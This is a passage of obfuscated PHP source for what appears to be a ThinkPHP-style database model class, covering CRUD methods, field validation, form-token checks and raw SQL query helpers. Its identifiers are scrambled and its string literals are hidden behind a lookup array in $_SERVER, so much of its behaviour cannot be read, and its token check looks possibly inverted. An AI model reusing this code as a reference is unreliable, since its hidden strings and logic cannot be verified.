$Õå˜Ëã•[$“ˆ…»¾Ÿ[362]][$Ö‡óâ›Ö]; } if (!1 === $this->_beforeUpdate($¯ÓË¶“´, $Õå˜Ëã•)) { return !1; } $çéÖÅÒˆ = $this->db->update($¯ÓË¶“´, $Õå˜Ëã•); if (!1 !== $çéÖÅÒˆ) { if (isset($­Øš½‚Œ)) { $¯ÓË¶“´[$Ö‡óâ›Ö] = $­Øš½‚Œ; } $this->_afterUpdate($¯ÓË¶“´, $Õå˜Ëã•); } return $çéÖÅÒˆ; } protected function _beforeUpdate(&$›áİ­É¯, $­µØš””) { } protected function _afterUpdate($›ˆÊ¹Ğ÷, $³¿¼ß©Ÿ) { } public function delete($¾ÖşÓİ = array()) { $ûÚ¾µ³Ò =& $_SERVER[øşô´çË]; if (empty($¾ÖşÓİ) && empty($this->options[$ûÚ¾µ³Ò[362]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $·Õ•óŞ = $this->getPk(); if (is_numeric($¾ÖşÓİ) || is_string($¾ÖşÓİ)) { if (strpos($¾ÖşÓİ, $ûÚ¾µ³Ò[60])) { $ØÚÎáÆ‚[$·Õ•óŞ] = array($ûÚ¾µ³Ò[363], $¾ÖşÓİ); } else { $ØÚÎáÆ‚[$·Õ•óŞ] = $¾ÖşÓİ; } $this->options[$ûÚ¾µ³Ò[362]] = $ØÚÎáÆ‚; } $¾ÖşÓİ = $this->_parseOptions(); if (is_array($¾ÖşÓİ[$ûÚ¾µ³Ò[362]]) && isset($¾ÖşÓİ[$ûÚ¾µ³Ò[362]][$·Õ•óŞ])) { $ñ¤·ÊÙŞ = $¾ÖşÓİ[$ûÚ¾µ³Ò[362]][$·Õ•óŞ]; } $ğÛ¬äœ¿ = $this->db->delete($¾ÖşÓİ); if (!1 !== $ğÛ¬äœ¿) { $·®©¯Œ = array(); if (isset($ñ¤·ÊÙŞ)) { $·®©¯Œ[$·Õ•óŞ] = $ñ¤·ÊÙŞ; } $this->_after_delete($·®©¯Œ, $¾ÖşÓİ); } return $ğÛ¬äœ¿; } protected function _after_delete($ƒ¼¾ûÀÉ, $¤şş»‘¶) { } public function select($ã‚š†… = array()) { $£Åş–È± =& $_SERVER[øşô´çË]; if (is_string($ã‚š†…) || is_numeric($ã‚š†…)) { $òº¾×ä¬ = $this->getPk(); if (strpos($ã‚š†…, $£Åş–È±[60])) { $˜«¦¥şœ[$òº¾×ä¬] = array($£Åş–È±[363], $ã‚š†…); } else { $˜«¦¥şœ[$òº¾×ä¬] = $ã‚š†…; } $this->options[$£Åş–È±[362]] = $˜«¦¥şœ; } elseif (!1 === $ã‚š†…) { $ã‚š†… = $this->_parseOptions(); return $£Åş–È±[364] . $this->db->buildSelectSql($ã‚š†…) . $£Åş–È±[365]; } $ã‚š†… = $this->_parseOptions(); $Ÿ¼­†ä = $this->db->select($ã‚š†…); if (!1 === $Ÿ¼­†ä) { return !1; } if (empty($Ÿ¼­†ä)) { return null; } $this->_afterSelect($Ÿ¼­†ä, $ã‚š†…); return $Ÿ¼­†ä; } protected function _afterSelect(&$‘ƒ§¦ŸÎ, $èşğ£›å) { } public function buildSql($½ƒÉ¥€© = array()) { $İ†ùæó¤ =& $_SERVER[øşô´çË]; $½ƒÉ¥€© = $this->_parseOptions($½ƒÉ¥€©); return $İ†ùæó¤[364] . $this->db->buildSelectSql($½ƒÉ¥€©) . $İ†ùæó¤[365]; } public function optionsValue($ÒÔ¿Öİ¾ = null) { if (is_null($ÒÔ¿Öİ¾)) { return $this->options; } elseif (is_array($ÒÔ¿Öİ¾)) { $this->options = array_merge($this->options, $ÒÔ¿Öİ¾); } } protected function _parseOptions($àû„ß¦á = array()) { $á±äÙ¥Í =& $_SERVER[øşô´çË]; if (is_array($àû„ß¦á)) { $àû„ß¦á = array_merge($this->options, $àû„ß¦á); } $this->options = array(); if (!isset($àû„ß¦á[$á±äÙ¥Í[366]])) { $àû„ß¦á[$á±äÙ¥Í[366]] = $this->getTableName(); $ß‹õÜšî = $this->fields; } else { $ß‹õÜšî = $this->getDbFields(); } if (!empty($àû„ß¦á[$á±äÙ¥Í[367]])) { $àû„ß¦á[$á±äÙ¥Í[366]] .= $á±äÙ¥Í[63] . $àû„ß¦á[$á±äÙ¥Í[367]]; } $àû„ß¦á[$á±äÙ¥Í[368]] = $this->name; if (isset($àû„ß¦á[$á±äÙ¥Í[362]]) && is_array($àû„ß¦á[$á±äÙ¥Í[362]]) && !empty($ß‹õÜšî) && !isset($àû„ß¦á[$á±äÙ¥Í[369]]) && !isset($àû„ß¦á[$á±äÙ¥Í[366]])) { foreach ($àû„ß¦á[$á±äÙ¥Í[362]] as $‘Ó¶Ùí => $Ê¸ãä¢Ç) { $‘Ó¶Ùí = trim($‘Ó¶Ùí); if (in_array($‘Ó¶Ùí, $ß‹õÜšî, !0)) { if (is_scalar($Ê¸ãä¢Ç)) { $this->_parseType($àû„ß¦á[$á±äÙ¥Í[362]], $‘Ó¶Ùí); } } elseif (!is_numeric($‘Ó¶Ùí) && $á±äÙ¥Í[11] != substr($‘Ó¶Ùí, 0, 1) && !1 === strpos($‘Ó¶Ùí, $á±äÙ¥Í[10]) && !1 === strpos($‘Ó¶Ùí, $á±äÙ¥Í[346]) && !1 === strpos($‘Ó¶Ùí, $á±äÙ¥Í[222]) && !1 === strpos($‘Ó¶Ùí, $á±äÙ¥Í[294])) { unset($àû„ß¦á[$á±äÙ¥Í[362]][$‘Ó¶Ùí]); } } } $this->_options_filter($àû„ß¦á); return $àû„ß¦á; } protected function _options_filter(&$Ì—¥ü¤µ) { } protected function _parseType(&$ËÏ Ì‘², $Ï¸Å—ßÀ) { $ÂÛõ—Â¯ =& $_SERVER[øşô´çË]; if (empty($this->options[$ÂÛõ—Â¯[370]][$ÂÛõ—Â¯[4] . $Ï¸Å—ßÀ])) { $ÉöØŒ°ø = strtolower($this->fields[$ÂÛõ—Â¯[338]][$Ï¸Å—ßÀ]); if (!1 !== strpos($ÉöØŒ°ø, $ÂÛõ—Â¯[371])) { } elseif (!1 === strpos($ÉöØŒ°ø, $ÂÛõ—Â¯[372]) && !1 !== strpos($ÉöØŒ°ø, $ÂÛõ—Â¯[373])) { $ËÏ Ì‘²[$Ï¸Å—ßÀ] = intval($ËÏ Ì‘²[$Ï¸Å—ßÀ]); } elseif (!1 !== strpos($ÉöØŒ°ø, $ÂÛõ—Â¯[374]) || !1 !== strpos($ÉöØŒ°ø, $ÂÛõ—Â¯[375])) { $ËÏ Ì‘²[$Ï¸Å—ßÀ] = floatval($ËÏ Ì‘²[$Ï¸Å—ßÀ]); } elseif (!1 !== strpos($ÉöØŒ°ø, $ÂÛõ—Â¯[376])) { $ËÏ Ì‘²[$Ï¸Å—ßÀ] = (bool) $ËÏ Ì‘²[$Ï¸Å—ßÀ]; } } } public function find($æ‘Íí…È = array()) { $†¾å¯üœ =& $_SERVER[øşô´çË]; if (is_numeric($æ‘Íí…È) || is_string($æ‘Íí…È)) { $şÅ™«èß[$this->getPk()] = intval($æ‘Íí…È); $this->options[$†¾å¯üœ[362]] = $şÅ™«èß; } $this->options[$†¾å¯üœ[377]] = 1; $æ‘Íí…È = $this->_parseOptions(); $Áµö‰¼Ö = $this->db->select($æ‘Íí…È); if (!1 === $Áµö‰¼Ö) { return !1; } if (empty($Áµö‰¼Ö)) { return null; } $ë¡å¯Ş = $Áµö‰¼Ö[0]; $this->_afterFind($ë¡å¯Ş, $æ‘Íí…È); return $ë¡å¯Ş; } protected function _afterFind(&$ñ£Ôä¶, $®€ÓÉÔî) { } protected function returnResult($Ò¿ÊÆ°, $¯Äµ¼¹¡ = '') { $Ú—á°Öş =& $_SERVER[øşô´çË]; if ($¯Äµ¼¹¡) { if (is_callable($¯Äµ¼¹¡)) { return call_user_func($¯Äµ¼¹¡, $Ò¿ÊÆ°); } switch (strtolower($¯Äµ¼¹¡)) { case $Ú—á°Öş[378]: return json_encode($Ò¿ÊÆ°); case $Ú—á°Öş[379]: return xml_encode($Ò¿ÊÆ°); } } return $Ò¿ÊÆ°; } public function parseFieldsMap($ì“¶’Í, $´¥ûÚğ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $“©µ¨İ => $‰”š¾–ø) { if ($´¥ûÚğ == 1) { if (isset($ì“¶’Í[$‰”š¾–ø])) { $ì“¶’Í[$“©µ¨İ] = $ì“¶’Í[$‰”š¾–ø]; unset($ì“¶’Í[$‰”š¾–ø]); } } else { if (isset($ì“¶’Í[$“©µ¨İ])) { $ì“¶’Í[$‰”š¾–ø] = $ì“¶’Í[$“©µ¨İ]; unset($ì“¶’Í[$“©µ¨İ]); } } } } return $ì“¶’Í; } public function setField($ß‡è¡åÚ, $±‹ªì÷ = '') { if (is_array($ß‡è¡åÚ)) { $ÕÖÕÛè = $ß‡è¡åÚ; } else { $ÕÖÕÛè[$ß‡è¡åÚ] = $±‹ªì÷; } return $this->save($ÕÖÕÛè); } public function setAdd($¿†Àñãç, $¸­Í—®º = 1) { $ÁöåÓç =& $_SERVER[øşô´çË]; $’Ø…Ë = $¿†Àñãç . $ÁöåÓç[380] . $¸­Í—®º; if ($¸­Í—®º < 0) { $’Ø…Ë = $¿†Àñãç . $¸­Í—®º; } return $this->setField($¿†Àñãç, array($ÁöåÓç[381], $’Ø…Ë)); } public function getField($Ê¼¾ÎÚÄ, $–™¾Öïè = null) { $óáÃªÇÍ =& $_SERVER[øşô´çË]; $Û¾ÖçË­[$óáÃªÇÍ[360]] = $Ê¼¾ÎÚÄ; $Û¾ÖçË­ = $this->_parseOptions($Û¾ÖçË­); $Ê¼¾ÎÚÄ = trim($Ê¼¾ÎÚÄ); if (strpos($Ê¼¾ÎÚÄ, $óáÃªÇÍ[60])) { if (!isset($Û¾ÖçË­[$óáÃªÇÍ[377]])) { $Û¾ÖçË­[$óáÃªÇÍ[377]] = is_numeric($–™¾Öïè) ? $–™¾Öïè : $óáÃªÇÍ[12]; } $Ûû‹óû¥ = $this->db->select($Û¾ÖçË­); if (!empty($Ûû‹óû¥)) { $ìàßæ…û = explode($óáÃªÇÍ[60], $Ê¼¾ÎÚÄ); $Ê¼¾ÎÚÄ = array_keys($Ûû‹óû¥[0]); $’˜»©” = array_shift($Ê¼¾ÎÚÄ); $½ï¥’Æ² = array_shift($Ê¼¾ÎÚÄ); $Óíã¹± = array(); $¸¨è–Œó = count($ìàßæ…û); foreach ($Ûû‹óû¥ as $Í’´Æ³ï) { $ı°¯Ïçö = $Í’´Æ³ï[$’˜»©”]; if (2 == $¸¨è–Œó) { $Óíã¹±[$ı°¯Ïçö] = $Í’´Æ³ï[$½ï¥’Æ²]; } else { $Óíã¹±[$ı°¯Ïçö] = is_string($–™¾Öïè) ? implode($–™¾Öïè, $Í’´Æ³ï) : $Í’´Æ³ï; } } return $Óíã¹±; } } else { if (!0 !== $–™¾Öïè) { $Û¾ÖçË­[$óáÃªÇÍ[377]] = is_numeric($–™¾Öïè) ? $–™¾Öïè : 1; } if ($–™¾Öïè === $óáÃªÇÍ[341]) { unset($Û¾ÖçË­[$óáÃªÇÍ[377]]); } $Í’´Æ³ï = $this->db->select($Û¾ÖçË­); if (!empty($Í’´Æ³ï)) { if ($–™¾Öïè === $óáÃªÇÍ[341]) { return reset($Í’´Æ³ï[0]); } if (!0 !== $–™¾Öïè && 1 == $Û¾ÖçË­[$óáÃªÇÍ[377]]) { return reset($Í’´Æ³ï[0]); } foreach ($Í’´Æ³ï as $äˆıñ–Î) { $Ã§Æ“”Å[] = $äˆıñ–Î[$Ê¼¾ÎÚÄ]; } return $Ã§Æ“”Å; } } return null; } public function create($Ó¶Ûà€¤ = '', $‘€”ç†Ç = '') { $í½üšÕ =& $_SERVER[øşô´çË]; if (empty($Ó¶Ûà€¤)) { $Ó¶Ûà€¤ = $_POST; } elseif (is_object($Ó¶Ûà€¤)) { $Ó¶Ûà€¤ = get_object_vars($Ó¶Ûà€¤); } if (empty($Ó¶Ûà€¤) || !is_array($Ó¶Ûà€¤)) { $this->error = think_lang($í½üšÕ[358]); return !1; } $Ó¶Ûà€¤ = $this->parseFieldsMap($Ó¶Ûà€¤, 0); $‘€”ç†Ç = $‘€”ç†Ç ? $‘€”ç†Ç : (!empty($Ó¶Ûà€¤[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$í½üšÕ[360]])) { $¡Üæéå = $this->options[$í½üšÕ[360]]; unset($this->options[$í½üšÕ[360]]); } elseif ($‘€”ç†Ç == THINK_MODEL_INSERT && isset($this->insertFields)) { $¡Üæéå = $this->insertFields; } elseif ($‘€”ç†Ç == THINK_MODEL_UPDATE && isset($this->updateFields)) { $¡Üæéå = $this->updateFields; } if (isset($¡Üæéå)) { if (is_string($¡Üæéå)) { $¡Üæéå = explode($í½üšÕ[60], $¡Üæéå); } if (think_config($í½üšÕ[382])) { $¡Üæéå[] = think_config($í½üšÕ[383]); } foreach ($Ó¶Ûà€¤ as $Ù¥İ¹¦› => $ÓâŒáûØ) { if (!in_array($Ù¥İ¹¦›, $¡Üæéå)) { unset($Ó¶Ûà€¤[$Ù¥İ¹¦›]); } } } if (!$this->autoValidation($Ó¶Ûà€¤, $‘€”ç†Ç)) { return !1; } if (!$this->autoCheckToken($Ó¶Ûà€¤)) { $this->error = think_lang($í½üšÕ[384]); return !1; } if ($this->autoCheckFields) { $¡Üæéå = $this->getDbFields(); foreach ($Ó¶Ûà€¤ as $Ù¥İ¹¦› => $ÓâŒáûØ) { if (!in_array($Ù¥İ¹¦›, $¡Üæéå)) { unset($Ó¶Ûà€¤[$Ù¥İ¹¦›]); } elseif (MAGIC_QUOTES_GPC && is_string($ÓâŒáûØ)) { $Ó¶Ûà€¤[$Ù¥İ¹¦›] = stripslashes($ÓâŒáûØ); } } } $this->autoOperation($Ó¶Ûà€¤, $‘€”ç†Ç); $this->data = $Ó¶Ûà€¤; return $Ó¶Ûà€¤; } public function autoCheckToken($üçé­Ò¸) { $åÆÌ÷’š =& $_SERVER[øşô´çË]; if (isset($this->options[$åÆÌ÷’š[385]]) && !$this->options[$åÆÌ÷’š[385]]) { return !0; } if (think_config($åÆÌ÷’š[382])) { $÷Šìüİ¾ = think_config($åÆÌ÷’š[383]); if (!isset($üçé­Ò¸[$÷Šìüİ¾]) || Session::get($÷Šìüİ¾)) { return !1; } list($Üç£¤ÌÓ, $Õ‚šÚÉÕ) = explode($åÆÌ÷’š[11], $üçé­Ò¸[$÷Šìüİ¾]); if ($Õ‚šÚÉÕ && Session::get($÷Šìüİ¾ . $åÆÌ÷’š[10] . $Üç£¤ÌÓ) === $Õ‚šÚÉÕ) { Session::remove($÷Šìüİ¾ . $åÆÌ÷’š[10] . $Üç£¤ÌÓ); return !0; } if (think_config($åÆÌ÷’š[386])) { Session::remove($÷Šìüİ¾ . $åÆÌ÷’š[10] . $Üç£¤ÌÓ); } return !1; } return !0; } public function regex($Òş§ŸËó, $™¼õî³·) { $ÈÆıÓ =& $_SERVER[øşô´çË]; $µ“¥Œ«„ = array($ÈÆıÓ[387] => $ÈÆıÓ[388], $ÈÆıÓ[389] => $ÈÆıÓ[390], $ÈÆıÓ[391] => $ÈÆıÓ[392], $ÈÆıÓ[393] => $ÈÆıÓ[394], $ÈÆıÓ[395] => $ÈÆıÓ[396], $ÈÆıÓ[397] => $ÈÆıÓ[398], $ÈÆıÓ[399] => $ÈÆıÓ[400], $ÈÆıÓ[375] => $ÈÆıÓ[401], $ÈÆıÓ[402] => $ÈÆıÓ[403]); if (isset($µ“¥Œ«„[strtolower($™¼õî³·)])) { $™¼õî³· = $µ“¥Œ«„[strtolower($™¼õî³·)]; } return preg_match($™¼õî³·, $Òş§ŸËó) === 1; } private function autoOperation(&$öá°×©², $ÙÎÕ…Ã») { $Åû¾ê´ğ =& $_SERVER[øşô´çË]; if (!empty($this->options[$Åû¾ê´ğ[404]])) { $»Ëú”Óô = $this->options[$Åû¾ê´ğ[404]]; unset($this->options[$Åû¾ê´ğ[404]]); } elseif (!empty($this->_auto)) { $»Ëú”Óô = $this->_auto; } if (isset($»Ëú”Óô)) { foreach ($»Ëú”Óô as $’¢îÔÑÕ) { if (empty($’¢îÔÑÕ[2])) { $’¢îÔÑÕ[2] = THINK_MODEL_INSERT; } if ($ÙÎÕ…Ã» == $’¢îÔÑÕ[2] || $’¢îÔÑÕ[2] == THINK_MODEL_BOTH) { switch (trim($’¢îÔÑÕ[3])) { case $Åû¾ê´ğ[405]: case $Åû¾ê´ğ[406]: $Å˜†¸ÌÇ = isset($’¢îÔÑÕ[4]) ? (array) $’¢îÔÑÕ[4] : array(); if (isset($öá°×©²[$’¢îÔÑÕ[0]])) { array_unshift($Å˜†¸ÌÇ, $öá°×©²[$’¢îÔÑÕ[0]]); } if ($Åû¾ê´ğ[405] == $’¢îÔÑÕ[3]) { $öá°×©²[$’¢îÔÑÕ[0]] = call_user_func_array($’¢îÔÑÕ[1], $Å˜†¸ÌÇ); } else { $öá°×©²[$’¢îÔÑÕ[0]] = call_user_func_array(array(&$this, $’¢îÔÑÕ[1]), $Å˜†¸ÌÇ); } break; case $Åû¾ê´ğ[360]: $öá°×©²[$’¢îÔÑÕ[0]] = $öá°×©²[$’¢îÔÑÕ[1]]; break; case $Åû¾ê´ğ[407]: if ($Åû¾ê´ğ[12] === $öá°×©²[$’¢îÔÑÕ[0]]) { unset($öá°×©²[$’¢îÔÑÕ[0]]); } break; case $Åû¾ê´ğ[408]: default: $öá°×©²[$’¢îÔÑÕ[0]] = $’¢îÔÑÕ[1]; } if (!1 === $öá°×©²[$’¢îÔÑÕ[0]]) { unset($öá°×©²[$’¢îÔÑÕ[0]]); } } } } return $öá°×©²; } protected function autoValidation($Ö³«»ñø, $àøµ°·ğ) { $¨±Ã¿Ò¼ =& $_SERVER[øşô´çË]; if (!empty($this->options[$¨±Ã¿Ò¼[409]])) { $Ì˜ó¢©– = $this->options[$¨±Ã¿Ò¼[409]]; unset($this->options[$¨±Ã¿Ò¼[409]]); } elseif (!empty($this->_validate)) { $Ì˜ó¢©– = $this->_validate; } if (isset($Ì˜ó¢©–)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Ì˜ó¢©– as $´÷¼Ù´§ => $‡ ¿”Áû) { if (empty($‡ ¿”Áû[5]) || $‡ ¿”Áû[5] == THINK_MODEL_BOTH || $‡ ¿”Áû[5] == $àøµ°·ğ) { if (0 == strpos($‡ ¿”Áû[2], $¨±Ã¿Ò¼[410]) && strpos($‡ ¿”Áû[2], $¨±Ã¿Ò¼[411])) { $‡ ¿”Áû[2] = think_lang(substr($‡ ¿”Áû[2], 2, -1)); } $‡ ¿”Áû[3] = isset($‡ ¿”Áû[3]) ? $‡ ¿”Áû[3] : THINK_EXISTS_VALIDATE; $‡ ¿”Áû[4] = isset($‡ ¿”Áû[4]) ? $‡ ¿”Áû[4] : $¨±Ã¿Ò¼[412]; switch ($‡ ¿”Áû[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Ö³«»ñø, $‡ ¿”Áû)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¨±Ã¿Ò¼[12] != trim($Ö³«»ñø[$‡ ¿”Áû[0]])) { if (!1 === $this->_validationField($Ö³«»ñø, $‡ ¿”Áû)) { return !1; } } break; default: if (isset($Ö³«»ñø[$‡ ¿”Áû[0]])) { if (!1 === $this->_validationField($Ö³«»ñø, $‡ ¿”Áû)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($§£æùó–, $ĞĞàÎÏÏ) { if (!1 === $this->_validationFieldItem($§£æùó–, $ĞĞàÎÏÏ)) { if ($this->patchValidate) { $this->error[$ĞĞàÎÏÏ[0]] = $ĞĞàÎÏÏ[2]; } else { $this->error = $ĞĞàÎÏÏ[2]; return !1; } } return; } protected function _validationFieldItem($Ä”¨Î¦õ, $à¾º·) { $¼ş•èşŸ =& $_SERVER[øşô´çË]; switch (strtolower(trim($à¾º·[4]))) { case $¼ş•èşŸ[405]: case $¼ş•èşŸ[406]: $çè¹ = isset($à¾º·[6]) ? (array) $à¾º·[6] : array(); if (is_string($à¾º·[0]) && strpos($à¾º·[0], $¼ş•èşŸ[60])) { $à¾º·[0] = explode($¼ş•èşŸ[60], $à¾º·[0]); } if (is_array($à¾º·[0])) { foreach ($à¾º·[0] as $¿ÀÇëİª) { $©—â´ÔÓ[$¿ÀÇëİª] = $Ä”¨Î¦õ[$¿ÀÇëİª]; } array_unshift($çè¹, $©—â´ÔÓ); } else { array_unshift($çè¹, $Ä”¨Î¦õ[$à¾º·[0]]); } if ($¼ş•èşŸ[405] == $à¾º·[4]) { return call_user_func_array($à¾º·[1], $çè¹); } else { return call_user_func_array(array(&$this, $à¾º·[1]), $çè¹); } case $¼ş•èşŸ[413]: return $Ä”¨Î¦õ[$à¾º·[0]] == $Ä”¨Î¦õ[$à¾º·[1]]; case $¼ş•èşŸ[414]: if (is_string($à¾º·[0]) && strpos($à¾º·[0], $¼ş•èşŸ[60])) { $à¾º·[0] = explode($¼ş•èşŸ[60], $à¾º·[0]); } $¡è«Í¿­ = array(); if (is_array($à¾º·[0])) { foreach ($à¾º·[0] as $¿ÀÇëİª) { $¡è«Í¿­[$¿ÀÇëİª] = $Ä”¨Î¦õ[$¿ÀÇëİª]; } } else { $¡è«Í¿­[$à¾º·[0]] = $Ä”¨Î¦õ[$à¾º·[0]]; } if (!empty($Ä”¨Î¦õ[$this->getPk()])) { $¡è«Í¿­[$this->getPk()] = array($¼ş•èşŸ[415], $Ä”¨Î¦õ[$this->getPk()]); } if ($this->where($¡è«Í¿­)->find()) { return !1; } return !0; default: return $this->check($Ä”¨Î¦õ[$à¾º·[0]], $à¾º·[1], $à¾º·[4]); } } public function check($ó§‰ÒË¶, $ò¿ë®°, $¶²ë¦° = "\x72\145\x67\x65\170") { $¾îÂË›œ =& $_SERVER[øşô´çË]; $¶²ë¦° = strtolower(trim($¶²ë¦°)); switch ($¶²ë¦°) { case $¾îÂË›œ[7]: case $¾îÂË›œ[416]: $êñ²–ßï = is_array($ò¿ë®°) ? $ò¿ë®° : explode($¾îÂË›œ[60], $ò¿ë®°); return $¶²ë¦° == $¾îÂË›œ[7] ? in_array($ó§‰ÒË¶, $êñ²–ßï) : !in_array($ó§‰ÒË¶, $êñ²–ßï); case $¾îÂË›œ[417]: case $¾îÂË›œ[418]: if (is_array($ò¿ë®°)) { $Ô£÷ÕØ² = $ò¿ë®°[0]; $áÓ¨ëàÕ = $ò¿ë®°[1]; } else { list($Ô£÷ÕØ², $áÓ¨ëàÕ) = explode($¾îÂË›œ[60], $ò¿ë®°); } return $¶²ë¦° == $¾îÂË›œ[417] ? $ó§‰ÒË¶ >= $Ô£÷ÕØ² && $ó§‰ÒË¶ <= $áÓ¨ëàÕ : $ó§‰ÒË¶ < $Ô£÷ÕØ² || $ó§‰ÒË¶ > $áÓ¨ëàÕ; case $¾îÂË›œ[419]: case $¾îÂË›œ[420]: return $¶²ë¦° == $¾îÂË›œ[419] ? $ó§‰ÒË¶ == $ò¿ë®° : $ó§‰ÒË¶ != $ò¿ë®°; case $¾îÂË›œ[421]: $ÕÎóİ™Ñ = mb_strlen($ó§‰ÒË¶, $¾îÂË›œ[422]); if (strpos($ò¿ë®°, $¾îÂË›œ[60])) { list($Ô£÷ÕØ², $áÓ¨ëàÕ) = explode($¾îÂË›œ[60], $ò¿ë®°); return $ÕÎóİ™Ñ >= $Ô£÷ÕØ² && $ÕÎóİ™Ñ <= $áÓ¨ëàÕ; } else { return $ÕÎóİ™Ñ == $ò¿ë®°; } case $¾îÂË›œ[423]: list($ÖÑ‰íÆ®, $…¡ù¦åÜ) = explode($¾îÂË›œ[60], $ò¿ë®°); if (!is_numeric($ÖÑ‰íÆ®)) { $ÖÑ‰íÆ® = strtotime($ÖÑ‰íÆ®); } if (!is_numeric($…¡ù¦åÜ)) { $…¡ù¦åÜ = strtotime($…¡ù¦åÜ); } return NOW_TIME >= $ÖÑ‰íÆ® && NOW_TIME <= $…¡ù¦åÜ; case $¾îÂË›œ[424]: return in_array(get_client_ip(), explode($¾îÂË›œ[60], $ò¿ë®°)); case $¾îÂË›œ[425]: return !in_array(get_client_ip(), explode($¾îÂË›œ[60], $ò¿ë®°)); case $¾îÂË›œ[412]: default: return $this->regex($ó§‰ÒË¶, $ò¿ë®°); } } public function query($õè©…¿, $‰ÀÓã÷ˆ = false) { $¦â‰¿ß‚ =& $_SERVER[øşô´çË]; if (!is_bool($‰ÀÓã÷ˆ) && !is_array($‰ÀÓã÷ˆ)) { $‰ÀÓã÷ˆ = func_get_args(); array_shift($‰ÀÓã÷ˆ); } $õè©…¿ = str_replace(array($¦â‰¿ß‚[19], $¦â‰¿ß‚[426]), $¦â‰¿ß‚[63], $õè©…¿); $õè©…¿ = $this->parseSql($õè©…¿, $‰ÀÓã÷ˆ); return $this->db->query($õè©…¿); } public function execute($’™û÷Ö­, $ÜÁƒÎÔ§ = false) { if (!is_bool($ÜÁƒÎÔ§) && !is_array($ÜÁƒÎÔ§)) { $ÜÁƒÎÔ§ = func_get_args(); array_shift($ÜÁƒÎÔ§); } $’™û÷Ö­ = $this->parseSql($’™û÷Ö­, $ÜÁƒÎÔ§); return $this->db->execute($’™û÷Ö­); } protected function parseSql($Øíª¤Ú°, $Ğ—£Ù±ğ) { $õÖó˜ùš =& $_SERVER[øşô´çË]; if (!0 === $Ğ—£Ù±ğ) { $Û¶ÊÄî¡ = $this->_parseOptions(); $Øíª¤Ú° = $this->db->parseSql($Øíª¤Ú°, $Û¶ÊÄî¡); } elseif (is_array($Ğ—£Ù±ğ)) { $Ğ—£Ù±ğ = array_map(array($this->db, $õÖó˜ùš[427]), $Ğ—£Ù±ğ); $Øíª¤Ú° = vsprintf($Øíª¤Ú°, $Ğ—£Ù±ğ); } else { $Øíª¤Ú° = strtr($Øíª¤Ú°, array($õÖó˜ùš[428] => $this->getTableName(), $õÖó˜ùš[429] => think_config($õÖó˜ùš[330]))); } $this->db->setModel($this->name); return $Øíª¤Ú°; } public function db($ƒÍœâÂ = '', $•³Èº‰Ï = '', $ƒî½ùğ = array()) { $’è ı† =& $_SERVER[øşô´çË]; if ($’è ı†[12] === $ƒÍœâÂ && $this->db) { return $this->db; } static $«‰Äàç = array(); static $à¾«³¹ = array(); if (!isset($à¾«³¹[$ƒÍœâÂ]) || isset($à¾«³¹[$ƒÍœâÂ]) && $•³Èº‰Ï && $«‰Äàç[$ƒÍœâÂ] != $•³Èº‰Ï) { if (!empty($•³Èº‰Ï) && is_string($•³Èº‰Ï) && !1 === strpos($•³Èº‰Ï, $’è ı†[8])) { $•³Èº‰Ï = think_config($•³Èº‰Ï); } $ƒÍœâÂ = think_guid($•³Èº‰Ï); $à¾«³¹[$ƒÍœâÂ] = Db::getInstance($•³Èº‰Ï); } elseif (NULL === $•³Èº‰Ï) { $à¾«³¹[$ƒÍœâÂ]->close(); unset($à¾«³¹[$ƒÍœâÂ]); return; } if (!empty($ƒî½ùğ)) { if (is_string($ƒî½ùğ)) { parse_str($ƒî½ùğ, $ƒî½ùğ); } foreach ($ƒî½ùğ as $³ªÆŞ´Î => $Ï©¢Á©ƒ) { $this->setProperty($³ªÆŞ´Î, $Ï©¢Á©ƒ); } } $«‰Äàç[$ƒÍœâÂ] = $•³Èº‰Ï; $this->db = $à¾«³¹[$ƒÍœâÂ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Áí´¥íá = get_class($this); if ($Áí´¥íá == $_SERVER[øşô´çË][430]) { return $this->name; } $this->name = substr($Áí´¥íá, 0, -5); } return $this->name; } public function getTableName() { $¢¡©ÏÁ» =& $_SERVER[øşô´çË]; if (empty($this->trueTableName)) { $‹ïº»â— = !empty($this->tablePrefix) ? $this->tablePrefix : $¢¡©ÏÁ»[12]; if (!empty($this->tableName)) { $‹ïº»â— .= $this->tableName; } else { $‹ïº»â— .= think_parse_name($this->name); } $this->trueTableName = strtolower($‹ïº»â—); } return (!empty($this->dbName) ? $this->dbName . $¢¡©ÏÁ»[10] : $¢¡©ÏÁ»[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ì”õ¾¤á =& $_SERVER[øşô´çË]; return isset($this->fields[$ì”õ¾¤á[337]]) ? $this->fields[$ì”õ¾¤á[337]] : $this->pk; } public function getDbFields() { $Ù´öğŠ =& $_SERVER[øşô´çË]; if (isset($this->options[$Ù´öğŠ[366]])) { $¾­ªïªß = $this->db->getFields($this->options[$Ù´öğŠ[366]]); return $¾­ªïªß ? array_keys($¾­ªïªß) : !1; } if ($this->fields) { $¾­ªïªß = $this->fields; unset($¾­ªïªß[$Ù´öğŠ[336]], $¾­ªïªß[$Ù´öğŠ[337]], $¾­ªïªß[$Ù´öğŠ[338]], $¾­ªïªß[$Ù´öğŠ[335]]); return $¾­ªïªß; } return !1; } public function data($ÖÖÀ±Êó = '') { $¬êÛ²¾ =& $_SERVER[øşô´çË]; if ($¬êÛ²¾[12] === $ÖÖÀ±Êó && !empty($this->data)) { return $this->data; } if (is_object($ÖÖÀ±Êó)) { $ÖÖÀ±Êó = get_object_vars($ÖÖÀ±Êó); } elseif (is_string($ÖÖÀ±Êó)) { parse_str($ÖÖÀ±Êó, $ÖÖÀ±Êó); } elseif (!is_array($ÖÖÀ±Êó)) { 